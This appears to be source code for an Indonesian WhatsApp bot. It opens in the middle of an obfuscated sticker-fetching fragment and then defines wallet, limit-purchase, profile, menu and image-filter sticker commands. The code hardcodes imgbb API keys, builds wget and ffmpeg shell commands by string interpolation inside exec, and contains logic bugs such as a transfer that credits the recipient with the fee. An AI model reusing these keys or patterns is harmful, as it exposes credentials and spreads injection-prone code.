-0x520,_0xf8a17a-0x1ec,_0x2ce182-0x13e,_0x2ce182);}const _0x238083={'cCsdz':function(_0x4b170c,_0x4043f6,_0x4989e8){return _0x4b170c(_0x4043f6,_0x4989e8);}};teks=''+_0x408b68[_0x4cf5d4(0x83f,0xc38,0xc6b,0xa6e)][0x26ca+-0x7a7+-0x1f1b][_0x4cf5d4(0x91c,0x5e7,0xc09,0x9f1)],console[_0x4cf5d4(0x2ec,0xfa,0x1ab,0x477)](teks),_0x238083[_0x4cf5d4(0xaae,0xb04,0x65d,0x899)](sendStickerFromUrl,from,''+teks);});sub_yt_zeeone_ofc==_0x406083(0x644,0x20c,0x941,0x131)+_0x406083(0x405,0x8cf,0x1c7,0x253)+q5&&(reply(lang[_0x406083(0x425,0xc,0x5d6,0x887)]()),emoji[_0x406083(0x835,0x551,0xc4c,0x434)](''+q5)[_0x4aaba1(0xb65,0x930,0xd21,0xf54)](_0x33dd29=>{function _0x574917(_0x34a5ba,_0x4b7c5f,_0x526e3f,_0x3a2871){return _0x406083(_0x526e3f- -0x84,_0x4b7c5f-0x15d,_0x526e3f-0x1e7,_0x3a2871);}const _0x3bff17={'ORgAb':function(_0x4f2642,_0xf9404f,_0x32077c){return _0x4f2642(_0xf9404f,_0x32077c);}};teks=''+_0x33dd29[_0x574917(0xe30,0x997,0x9d5,0x8e9)][0xa3*0x2b+-0xac+0x6*-0x472][_0x574917(0x6fa,0x5fe,0x958,0xa01)];function _0x2e7c09(_0x28e80b,_0x4db96a,_0x15d580,_0x5e87fb){return _0x406083(_0x15d580- -0x458,_0x4db96a-0x1a,_0x15d580-0xc4,_0x5e87fb);}console['log'](teks),_0x3bff17[_0x574917(0x5ee,-0x112,0x346,0x728)](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc=='Emoji-Mess'+'enger-'+q5&&emoji['get'](''+q5)[_0x406083(0xb30,0x88e,0xd72,0x634)](_0x265d34=>{function _0x250f33(_0x378d00,_0x7225dd,_0xd8c92a,_0x1f6c5d){return _0x406083(_0x378d00- -0x101,_0x7225dd-0x6c,_0xd8c92a-0xd2,_0xd8c92a);}function _0x3d48b6(_0x3a3d14,_0x12656c,_0x684022,_0x10b96c){return _0x4aaba1(_0x12656c-0x13c,_0x10b96c,_0x684022-0x6e,_0x10b96c-0x16);}const _0x5efa61={'xtdPG':function(_0x168d57,_0xf85dce,_0x3523fc){return _0x168d57(_0xf85dce,_0x3523fc);}};teks=''+_0x265d34[_0x250f33(0x958,0x4c0,0x8eb,0x8f6)][-0x1*0x184a+-0x15c5+0x2e19][_0x250f33(0x8db,0x861,0x46c,0x7d6)],console[_0x250f33(0x361,0x71d,0x780,0x6b2)](teks),_0x5efa61['xtdPG'](sendStickerFromUrl,from,''+teks);});sub_yt_zeeone_ofc==_0x406083(0x627,0x737,0x7c3,0x91f)+q5&&(reply(lang[_0x406083(0x425,0x5f4,0x242,0x869)]()),emoji['get'](''+q5)[_0x4aaba1(0xb65,0x1072,0xb11,0x669)](_0x420a1f=>{function _0x1283d6(_0x3b46b9,_0x42e254,_0x483318,_0x366b5b){return _0x4aaba1(_0x3b46b9- -0x3df,_0x483318,_0x483318-0x74,_0x366b5b-0x10d);}const _0x144c68={'CwWwF':function(_0x1e6153,_0x1b90a5,_0xb92ab9){return _0x1e6153(_0x1b90a5,_0xb92ab9);}};function _0x2fc894(_0x59dcfd,_0x3aecbc,_0x1671b1,_0x2f0439){return _0x406083(_0x59dcfd- -0x1ed,_0x3aecbc-0x140,_0x1671b1-0x1b0,_0x3aecbc);}teks=''+_0x420a1f[_0x1283d6(0x6af,0x6ba,0x2f7,0x2df)][-0x1acc+0x546*-0x3+0x2aa9]['url'],console[_0x2fc894(0x275,0x43b,0x2e3,0x15f)](teks),_0x144c68[_0x2fc894(0x71b,0x1fc,0x842,0x838)](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc==_0x406083(0x5e9,0x3fa,0x2ee,0x12d)+q5&&emoji[_0x406083(0x835,0x8b5,0x7d1,0x454)](''+q5)[_0x4aaba1(0xb65,0x6a0,0xdf2,0xd52)](_0x5a273d=>{function _0x44ad83(_0x2648df,_0x29f999,_0x40a90b,_0x1dcc07){return _0x4aaba1(_0x29f999-0x1db,_0x40a90b,_0x40a90b-0xff,_0x1dcc07-0x1d1);}function _0x25300c(_0x50dd39,_0x437cba,_0x251f2e,_0x4ec37e){return _0x406083(_0x251f2e- -0x468,_0x437cba-0x84,_0x251f2e-0x185,_0x4ec37e);}teks=''+_0x5a273d['images'][0x54d*-0x1+0xda7+-0x84e][_0x44ad83(0xe33,0xbec,0x1043,0x88d)],console[_0x25300c(0x42b,-0x2c1,-0x6,0x473)](teks),sendStickerFromUrl(from,''+teks);});
switch (command) {
case 'dompet':
					const kantong = checkATMuser(sender)
					reply(` *「 ATM USER 」* \n📛 *Nama* : ${pushname}\n🆔 *Nomer* : ${sender.split("@")[0]}\n💰 *Uang* : ${kantong}\n`)
					break
	case 'transfer':
				if (!q.includes('|')) return  reply('format salah')
                			const tujuan = q.substring(0, q.indexOf('|') - 1)
                			const jumblah = q.substring(q.lastIndexOf('|') + 1)
                			if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                			if (jumblah < 100 ) return reply(`Minimal Transfer 100`)
                			if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                			const tujuantf = `${tujuan.replace("@", '')}`
               				fee = 0.005 *  jumblah
                			hasiltf = jumblah + fee
                			addKoinUser(`${tujuantf}@s.whatsapp.net`, hasiltf)
                			confirmATM(sender, hasiltf)
                			reply(`*「 SUKSES  」*\n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : 30*jumblah`)
                			break
	case 'limit': case 'ceklimit': case 'balance': case 'glimit':
reply(`💳 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
🏧 Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
🏦 Balance : $${getBalance(sender, balance)}


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal* Dan ${prefix}Buyglimit *Nominal* Untuk Membeli Game Limit

*Example :*
${prefix}buylimit 10
${prefix}buyglimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
break
case 'buylimit':{
if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
let ane = Number(nebal(q) * 100)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(q), limit)
reply(`Pembeliaan limit sebanyak ${q} berhasil

*🏧 Sisa Balance : $${getBalance(sender, balance)}*
*🏦 Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
break
case 'buyglimit':{
if (!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
const koinPerlimit = 100
const total = koinPerlimit * q
if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
kurangBalance(sender, total, balance)
givegame(sender, q, glimit)
reply(`Pembeliaan game limit sebanyak ${q} berhasil

*💳 Sisa Balance : $${getBalance(sender, balance)}*
*💷 Sisa Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}*`)
}
break
	case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
let cek = ms( await premium.getPremiumExpired(sender, premium) - Date.now())
let userProcfile = `「 *USER INFO* 」

📛 Nama : ${pushname}
💋 Bio : ${bio_user}
🔗 Tag : @${sender.split("@")[0]}
💥 Api : wa.me/${sender.split("@")[0]}

💹 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
💳 Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
💷 Balance : $${getBalance(sender, balance)}
👛 Dompet : ${checkATMuser(sender)}
💱 Role : ${role}
🏧 Level : ${getLevelingLevel(sender)}
🏦 Xp : ${getLevelingXp(sender)}

💌 Status : ${isPremium? `Premium User` : `Free user`}
⏰ Expired Prem : ${isPremium ? 'Unlimited Premium' : ` ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`}
👨‍🎓 Register : ${isRegister? `Done`:`Belum Daftar`}
🚫 Baned : ${isBanned?`True`:`False`}`
let papakpo = [{
										"buttonId": `inv`,
										"buttonText": {
											"displayText": "INVENTORY"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, userProcfile , `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w\n\n${botname}™© | By ${ownername}`,pp_userz, papakpo, {contextInfo: { mentionedJid: [sender]}})
}
break
	case 'verify': case 'daftar':
 if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                break
	case 'menu': case 'help':
			try {
				chatt = await alpha.getProfilePicture(sender)
				} catch {
				chatt = 'https://l.top4top.io/p_20670hd6v1.jpg'
				}
			let ch = await getBuffer(chatt)
koko = `${targetpc}@s.whatsapp.net`
let content = fs.readFileSync(`image/${thumbnail}`)
const media = await alpha.prepareMessage(from, content, MessageType.image, { thumbnail:fs.readFileSync(`image/${thumbnail}`)})
let bacotlu = media.message["ephemeralMessage"] ? media.message.ephemeralMessage : media
let p1 = await alpha.getStatus(sender)
anunya = process.uptime()
ini_anu =`*_Hello I'm Keqing-bot_* 👋

			『 *BOT INFO*  』

*🔖 Creator :  @${koko.split('@')[0]}*
*🔖 Powered  : @${ini_mark.split('@')[0]}*
*🔖 Mode : ${status}*
*🔖 Status : ${offline ? 'OFFLINE' : 'ONLINE'}*
*🔖 Prefix : [  ${prefix}  ]*
*🔖 Group Chat : ${giid.length}*
*🔖 Private Chat : ${totalchat.length - giid.length}*
*🔖 Total Chat : ${totalchat.length}*
*🔖 Lib  : Baileys*
*🔖 Type  : NodeJs*
*🔖 Total hit : ${hitall}*
*🔖 Hit today : ${hit_today.length}*
*🔖 Speed : ${latensii.toFixed(4)} Second*
*🔖 Runtime : ${kyun(anunya)}*
*🔖 Battery : ${isBattre}*
*🔖 Charging : ${isCharge}*

			『 *YOUR INFO* 』

*〽️ Name : ${pushname}*
*〽️ Bio : ${p1 ? `${p1.status}` : '-'}*
*〽️ Nomor : @${sender.split('@')[0]}*
*〽️ Me : ${mek.key.fromMe ? 'True' : 'False'}*
*〽️ Owner : ${isOwner ? 'True' : `False`}*
`
if(menusimple == false){
sendButDoc(from, ini_anu, `??𝐥𝐞𝐚𝐬𝐞 𝐝𝐨𝐧'𝐭 𝐬𝐩𝐚𝐦 𝐛𝐨𝐭, 𝐩𝐚𝐮𝐬𝐞 𝟓 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐩𝐞𝐫 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.\n𝐓𝐡𝐚𝐧𝐤𝐬!`, sender, koko, ini_mark)
} else if(menusimple = true){ 
let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: content1})
let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1

const buttons1 = [
  {buttonId: 'ownerku', buttonText: {displayText: '⋮☰ OWNER'}, type: 1},
  {buttonId: 'statiktiknya', buttonText:{displayText: '✓ STATISTIC'}, type: 1},
  {buttonId: 'Command', buttonText: {displayText: '❍ LIST MESSAGE'}, type: 1}
]

const btn1 = {
    contentText: allmenu(prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat),
    footerText: `${tampilTanggal}${enter}${tampilWaktu}${enter}${enter}Regard @${koko.split('@')[0]}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender,koko,ini_mark],
            },
			quoted: fkontak,sendEphemeral: true 
			})
}

break
case 'setmenu':
if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
 if ((args[0]) == 'ori'){
menusimple = false
reply(`_Succses mengganti menu ke menu ori_`)
} else if((args[0]) == 'simple'){
menusimple = true
Mloc = false
reply(`_Succses mengganti menu ke menu simple_`)
} else {
reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
}
break
case 'setlang':
         if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
if(args[0] == 'ind'){
lang = ind
reply('Sukses mengubah bahasa ke ind')
}else if(args[0] == 'eng'){
lang = eng
reply('Success changing language to eng')
}else if(args[0] == 'es'){
lang = es
reply('Éxito cambiando el idioma a es')
}else if(args[0] == 'ml'){
lang = ml
reply('ഭാഷയിലേക്ക് മാറ്റുന്നതിൽ വിജയം ml')
}else if(args[0] == 'pt'){
lang = pt
reply('Sucesso ao alterar o idioma para pt')
}else if(args[0] == 'ru'){
lang = ru
reply('Успешно сменил язык на ru')
}else {
reply(`Example : ${prefix + command} eng\n\nAvailable\n•ind - Indonesia\n•eng - English\n•es - Spanish\n•ml - Malayalam\n•pt - Portugis\n•ru - Russian`)
}
break
                case 'allmenu':
                let papao = [{
										"buttonId": `owner`,
										"buttonText": {
											"displayText": "OWNER"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										},{
										"buttonId": 'Command',
										"buttonText": {
											"displayText": "LIST MESSAGE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, allmenu(prefix, wita, wit, ucapannya2 , timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat), `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w\n\n${botname}™© | By ${ownername}`,pp_userz, papao, {})
                break
        case 'trigger':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
					case 'sampah':
					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	                 
	                 owgi = await alpha.downloadAndSaveMediaMessage(ger)
	                 let aanu = await imgbb("55e7971b786836b9966eca4528210ba8", owgi)
	                let teks = `${aanu.display_url}`
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${teks}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					alpha.sendMessage(from, buffer, image, {caption : lang.success(),quoted: mek})
                   }
              break       
				
		case 'gay':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'glass':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/glass?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'passed':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/passed?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'jail':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/jail?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'comrade':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/comrade?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'hijau':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu6 = `https://some-random-api.ml/canvas/green?avatar=${teks}`
					exec(`wget ${anu6} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					
					})
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'biru':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu7 = `https://some-random-api.ml/canvas/blue?avatar=${teks}`
					exec(`wget ${anu7} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					 break 
		case 'greyscale':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/greyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invert?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert_greyscale':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invertgreyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'red':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/red?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break
